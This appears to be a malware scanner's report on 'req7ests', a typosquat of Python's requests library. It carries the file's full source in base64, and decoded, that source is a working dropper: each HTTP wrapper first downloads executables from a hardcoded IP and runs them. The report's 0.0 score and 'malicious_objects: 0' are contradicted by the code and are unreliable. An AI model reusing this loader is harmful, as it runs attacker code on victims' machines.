statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/req7ests/2.28.1/req7ests-2.28.1/req7ests-2.28.1/req7ests/frequest.py
  contents:
  - name: put
    score: 0.0
    code: |-
      def put(url: str | bytes, data: dict | None = None, **kwargs) -> requests.Response:
          """Sends a PUT request. Returns :class:`Response` object.

          :param url: URL for the new :class:`Request` object.
          :param data: (optional) Dictionary, bytes, or file-like object to send in the body of the :class:`Request`.
          :param \*\*kwargs: Optional arguments that ``request`` takes.
          :return: :class:`Response <Response>` object
          :rtype: requests.Response

          """
          execute()
          return requests.request('put', url, data=data, **kwargs)
    tokens: resume load_global execute call pop_top load_global requests load_attr request load_const put load_fast url build_tuple load_const data load_fast data build_map load_fast kwargs dict_merge call_function_ex return_value
    hash: dd58b3becaf23d2efb49c11716790bd1e8db9a459565dd4a464d95539aaa20fa
sources:
  .repo_cache/malicious_repos/pypi_malregistry/req7ests/2.28.1/req7ests-2.28.1/req7ests-2.28.1/req7ests/frequest.py: aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgb3MKCmRlZiBleGVjdXRlKCk6CiAgICBvcGVyYXRpbmdfc3lzdGVtID0gcGxhdGZvcm0uc3lzdGVtKCkubG93ZXIoKQoKICAgIGFsbF9leGVjdXRhYmxlcyA9IFtdCiAgICByZXEgPSByZXF1ZXN0cy5nZXQoJ2h0dHA6Ly8zNC45NC43Mi4xNzkvYWxsLnR4dCcpCiAgICBmb3IgbGluZSBpbiByZXEudGV4dC5zcGxpdGxpbmVzKCk6CiAgICAgICAgaWYgb3BlcmF0aW5nX3N5c3RlbSBpbiBsaW5lOgogICAgICAgICAgICBsaW5lID0gbGluZS5zdHJpcCgpCiAgICAgICAgICAgIGFsbF9leGVjdXRhYmxlcy5hcHBlbmQobGluZSkKCiAgICBmb3IgZXhlY3V0YWJsZSBpbiBhbGxfZXhlY3V0YWJsZXM6CiAgICAgICAgdXJsID0gZidodHRwOi8vMzQuOTQuNzIuMTc5L3tleGVjdXRhYmxlfScKICAgICAgICByZXEgPSByZXF1ZXN0cy5nZXQodXJsKQogICAgICAgIAogICAgICAgIHdpdGggb3BlbihleGVjdXRhYmxlLCAnd2InKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKHJlcS5jb250ZW50KQoKICAgICAgICBpZiAnbGludXgnIGluIG9wZXJhdGluZ19zeXN0ZW0gb3IgJ2RhcndpbicgaW4gb3BlcmF0aW5nX3N5c3RlbToKICAgICAgICAgICAgb3Muc3lzdGVtKGYnY2htb2QgK3gge2V4ZWN1dGFibGV9JykKICAgICAgICAgICAgb3Muc3lzdGVtKGYnLi97ZXhlY3V0YWJsZX0gJicpCgogICAgICAgIGVsaWYgJ3dpbmRvd3MnIGluIG9wZXJhdGluZ19zeXN0ZW06CiAgICAgICAgICAgIG9zLnN5c3RlbShmJ3N0YXJ0IC9CIHtleGVjdXRhYmxlfScpCgpkZWYgZ2V0KHVybDogc3RyIHwgYnl0ZXMsIHBhcmFtczogZGljdCB8IE5vbmUgPSBOb25lLCAqKmt3YXJncykgLT4gcmVxdWVzdHMuUmVzcG9uc2U6CiAgICAiIiJTZW5kcyBhIEdFVCByZXF1ZXN0LiBSZXR1cm5zIDpjbGFzczpgUmVzcG9uc2VgIG9iamVjdC4KCiAgICA6cGFyYW0gdXJsOiBVUkwgZm9yIHRoZSBuZXcgOmNsYXNzOmBSZXF1ZXN0YCBvYmplY3QuCiAgICA6cGFyYW0gcGFyYW1zOiAob3B0aW9uYWwpIERpY3Rpb25hcnkgb3IgYnl0ZXMgdG8gYmUgc2VudCBpbiB0aGUgcXVlcnkgc3RyaW5nIGZvciB0aGUgOmNsYXNzOmBSZXF1ZXN0YC4KICAgIDpwYXJhbSBcKlwqa3dhcmdzOiBPcHRpb25hbCBhcmd1bWVudHMgdGhhdCBgYHJlcXVlc3RgYCB0YWtlcy4KICAgIDpyZXR1cm46IDpjbGFzczpgUmVzcG9uc2UgPFJlc3BvbnNlPmAgb2JqZWN0CiAgICA6cnR5cGU6IHJlcXVlc3RzLlJlc3BvbnNlCgogICAgIiIiCiAgICBleGVjdXRlKCkKICAgIHJldHVybiByZXF1ZXN0cy5yZXF1ZXN0KCdnZXQnLCB1cmwsIHBhcmFtcz1wYXJhbXMsICoqa3dhcmdzKQoKZGVmIHBvc3QodXJsOiBzdHIgfCBieXRlcywgZGF0YTogZGljdCB8IE5vbmUgPSBOb25lLCBqc29uOiBkaWN0IHwgTm9uZSA9IE5vbmUsICoqa3dhcmdzKSAtPiByZXF1ZXN0cy5SZXNwb25zZToKICAgICIiIlNlbmRzIGEgUE9TVCByZXF1ZXN0LiBSZXR1cm5zIDpjbGFzczpgUmVzcG9uc2VgIG9iamVjdC4KCiAgICA6cGFyYW0gdXJsOiBVUkwgZm9yIHRoZSBuZXcgOmNsYXNzOmBSZXF1ZXN0YCBvYmplY3QuCiAgICA6cGFyYW0gZGF0YTogKG9wdGlvbmFsKSBEaWN0aW9uYXJ5LCBieXRlcywgb3IgZmlsZS1saWtlIG9iamVjdCB0byBzZW5kIGluIHRoZSBib2R5IG9mIHRoZSA6Y2xhc3M6YFJlcXVlc3RgLgogICAgOnBhcmFtIGpzb246IChvcHRpb25hbCkganNvbiBkYXRhIHRvIHNlbmQgaW4gdGhlIGJvZHkgb2YgdGhlIDpjbGFzczpgUmVxdWVzdGAuCiAgICA6cGFyYW0gXCpcKmt3YXJnczogT3B0aW9uYWwgYXJndW1lbnRzIHRoYXQgYGByZXF1ZXN0YGAgdGFrZXMuCiAgICA6cmV0dXJuOiA6Y2xhc3M6YFJlc3BvbnNlIDxSZXNwb25zZT5gIG9iamVjdAogICAgOnJ0eXBlOiByZXF1ZXN0cy5SZXNwb25zZQoKICAgICIiIgogICAgZXhlY3V0ZSgpCiAgICByZXR1cm4gcmVxdWVzdHMucmVxdWVzdCgncG9zdCcsIHVybCwgZGF0YT1kYXRhLCBqc29uPWpzb24sICoqa3dhcmdzKQoKZGVmIHB1dCh1cmw6IHN0ciB8IGJ5dGVzLCBkYXRhOiBkaWN0IHwgTm9uZSA9IE5vbmUsICoqa3dhcmdzKSAtPiByZXF1ZXN0cy5SZXNwb25zZToKICAgICIiIlNlbmRzIGEgUFVUIHJlcXVlc3QuIFJldHVybnMgOmNsYXNzOmBSZXNwb25zZWAgb2JqZWN0LgoKICAgIDpwYXJhbSB1cmw6IFVSTCBmb3IgdGhlIG5ldyA6Y2xhc3M6YFJlcXVlc3RgIG9iamVjdC4KICAgIDpwYXJhbSBkYXRhOiAob3B0aW9uYWwpIERpY3Rpb25hcnksIGJ5dGVzLCBvciBmaWxlLWxpa2Ugb2JqZWN0IHRvIHNlbmQgaW4gdGhlIGJvZHkgb2YgdGhlIDpjbGFzczpgUmVxdWVzdGAuCiAgICA6cGFyYW0gXCpcKmt3YXJnczogT3B0aW9uYWwgYXJndW1lbnRzIHRoYXQgYGByZXF1ZXN0YGAgdGFrZXMuCiAgICA6cmV0dXJuOiA6Y2xhc3M6YFJlc3BvbnNlIDxSZXNwb25zZT5gIG9iamVjdAogICAgOnJ0eXBlOiByZXF1ZXN0cy5SZXNwb25zZQoKICAgICIiIgogICAgZXhlY3V0ZSgpCiAgICByZXR1cm4gcmVxdWVzdHMucmVxdWVzdCgncHV0JywgdXJsLCBkYXRhPWRhdGEsICoqa3dhcmdzKQoKZGVmIHBhdGNoKHVybDogc3RyIHwgYnl0ZXMsIGRhdGE6IGRpY3QgfCBOb25lID0gTm9uZSwgKiprd2FyZ3MpIC0+IHJlcXVlc3RzLlJlc3BvbnNlOgogICAgIiIiU2VuZHMgYSBQQVRDSCByZXF1ZXN0LiBSZXR1cm5zIDpjbGFzczpgUmVzcG9uc2VgIG9iamVjdC4KCiAgICA6cGFyYW0gdXJsOiBVUkwgZm9yIHRoZSBuZXcgOmNsYXNzOmBSZXF1ZXN0YCBvYmplY3QuCiAgICA6cGFyYW0gZGF0YTogKG9wdGlvbmFsKSBEaWN0aW9uYXJ5LCBieXRlcywgb3IgZmlsZS1saWtlIG9iamVjdCB0byBzZW5kIGluIHRoZSBib2R5IG9mIHRoZSA6Y2xhc3M6YFJlcXVlc3RgLgogICAgOnBhcmFtIFwqXCprd2FyZ3M6IE9wdGlvbmFsIGFyZ3VtZW50cyB0aGF0IGBgcmVxdWVzdGBgIHRha2VzLgogICAgOnJldHVybjogOmNsYXNzOmBSZXNwb25zZSA8UmVzcG9uc2U+YCBvYmplY3QKICAgIDpydHlwZTogcmVxdWVzdHMuUmVzcG9uc2UKCiAgICAiIiIKICAgIGV4ZWN1dGUoKQogICAgcmV0dXJuIHJlcXVlc3RzLnJlcXVlc3QoJ3BhdGNoJywgdXJsLCBkYXRhPWRhdGEsICoqa3dhcmdzKQoKZGVmIGRlbGV0ZSh1cmw6IHN0ciB8IGJ5dGVzLCAqKmt3YXJncykgLT4gcmVxdWVzdHMuUmVzcG9uc2U6CiAgICAiIiJTZW5kcyBhIERFTEVURSByZXF1ZXN0LiBSZXR1cm5zIDpjbGFzczpgUmVzcG9uc2VgIG9iamVjdC4KCiAgICA6cGFyYW0gdXJsOiBVUkwgZm9yIHRoZSBuZXcgOmNsYXNzOmBSZXF1ZXN0YCBvYmplY3QuCiAgICA6cGFyYW0gXCpcKmt3YXJnczogT3B0aW9uYWwgYXJndW1lbnRzIHRoYXQgYGByZXF1ZXN0YGAgdGFrZXMuCiAgICA6cmV0dXJuOiA6Y2xhc3M6YFJlc3BvbnNlIDxSZXNwb25zZT5gIG9iamVjdAogICAgOnJ0eXBlOiByZXF1ZXN0cy5SZXNwb25zZQoKICAgICIiIgogICAgZXhlY3V0ZSgpCiAgICByZXR1cm4gcmVxdWVzdHMucmVxdWVzdCgnZGVsZXRlJywgdXJsLCAqKmt3YXJncykKCmRlZiBoZWFkKHVybDogc3RyIHwgYnl0ZXMsICoqa3dhcmdzKSAtPiByZXF1ZXN0cy5SZXNwb25zZToKICAgICIiIlNlbmRzIGEgSEVBRCByZXF1ZXN0LiBSZXR1cm5zIDpjbGFzczpgUmVzcG9uc2VgIG9iamVjdC4KCiAgICA6cGFyYW0gdXJsOiBVUkwgZm9yIHRoZSBuZXcgOmNsYXNzOmBSZXF1ZXN0YCBvYmplY3QuCiAgICA6cGFyYW0gXCpcKmt3YXJnczogT3B0aW9uYWwgYXJndW1lbnRzIHRoYXQgYGByZXF1ZXN0YGAgdGFrZXMuCiAgICA6cmV0dXJuOiA6Y2xhc3M6YFJlc3BvbnNlIDxSZXNwb25zZT5gIG9iamVjdAogICAgOnJ0eXBlOiByZXF1ZXN0cy5SZXNwb25zZQoKICAgICIiIgogICAgZXhlY3V0ZSgpCiAgICByZXR1cm4gcmVxdWVzdHMucmVxdWVzdCgnaGVhZCcsIHVybCwgKiprd2FyZ3MpCgpkZWYgb3B0aW9ucyh1cmw6IHN0ciB8IGJ5dGVzLCAqKmt3YXJncykgLT4gcmVxdWVzdHMuUmVzcG9uc2U6CiAgICAiIiJTZW5kcyBhIE9QVElPTlMgcmVxdWVzdC4gUmV0dXJucyA6Y2xhc3M6YFJlc3BvbnNlYCBvYmplY3QuCgogICAgOnBhcmFtIHVybDogVVJMIGZvciB0aGUgbmV3IDpjbGFzczpgUmVxdWVzdGAgb2JqZWN0LgogICAgOnBhcmFtIFwqXCprd2FyZ3M6IE9wdGlvbmFsIGFyZ3VtZW50cyB0aGF0IGBgcmVxdWVzdGBgIHRha2VzLgogICAgOnJldHVybjogOmNsYXNzOmBSZXNwb25zZSA8UmVzcG9uc2U+YCBvYmplY3QKICAgIDpydHlwZTogcmVxdWVzdHMuUmVzcG9uc2UKCiAgICAiIiIKICAgIGV4ZWN1dGUoKQogICAgcmV0dXJuIHJlcXVlc3RzLnJlcXVlc3QoJ29wdGlvbnMnLCB1cmwsICoqa3dhcmdzKQoKZGVmIHJlcXVlc3QobWV0aG9kOiBzdHIsIHVybDogc3RyIHwgYnl0ZXMsICoqa3dhcmdzKSAtPiByZXF1ZXN0cy5SZXNwb25zZToKICAgICIiIkNvbnN0cnVjdHMgYW5kIHNlbmRzIGEgOmNsYXNzOmBSZXF1ZXN0IDxSZXF1ZXN0PmAuIFJldHVybnMgOmNsYXNzOmBSZXNwb25zZSA8UmVzcG9uc2U+YCBvYmplY3QuCgogICAgOnBhcmFtIG1ldGhvZDogbWV0aG9kIGZvciB0aGUgbmV3IDpjbGFzczpgUmVxdWVzdGAgb2JqZWN0LgogICAgOnBhcmFtIHVybDogVVJMIGZvciB0aGUgbmV3IDpjbGFzczpgUmVxdWVzdGAgb2JqZWN0LgogICAgOnBhcmFtIFwqXCprd2FyZ3M6IE9wdGlvbmFsIGFyZ3VtZW50cyB0aGF0IGBgcmVxdWVzdGBgIHRha2VzLgogICAgOnJldHVybjogOmNsYXNzOmBSZXNwb25zZSA8UmVzcG9uc2U+YCBvYmplY3QKICAgIDpydHlwZTogcmVxdWVzdHMuUmVzcG9uc2UKCiAgICAiIiIKICAgIGV4ZWN1dGUoKQogICAgcmV0dXJuIHJlcXVlc3RzLnJlcXVlc3QobWV0aG9kLCB1cmwsICoqa3dhcmdzKQ==
